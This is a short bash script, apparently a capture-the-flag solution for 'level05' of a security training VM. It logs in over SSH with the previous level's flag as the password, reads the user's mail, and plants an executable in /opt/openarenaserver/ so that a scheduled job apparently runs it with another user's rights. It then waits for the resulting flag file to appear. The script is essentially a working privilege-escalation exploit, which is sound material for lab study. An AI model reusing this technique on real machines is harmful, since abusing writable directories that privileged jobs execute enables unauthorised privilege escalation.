#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level05@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level04/flag)

if [ $# -eq 1 ]; then
	# ssh
	sshpass -p $PASSWORD ssh -q $HOST -p $SSHPORT<<'ENDSSH'
		cat /var/mail/level05

	echo "[+] Add executable in /opt/openarenaserver/."
		echo "getflag > /tmp/flag05" > /opt/openarenaserver/getflag
		chmod a+x /opt/openarenaserver/getflag

	echo "[+] Waiting for server to execute our script ..."
		until [ -f /tmp/flag05 ]; do sleep 1; done && cat /tmp/flag05
ENDSSH

else
	printf "usage: ./script.sh [host]\n\texample [host] - 192.168.1.128"
fi
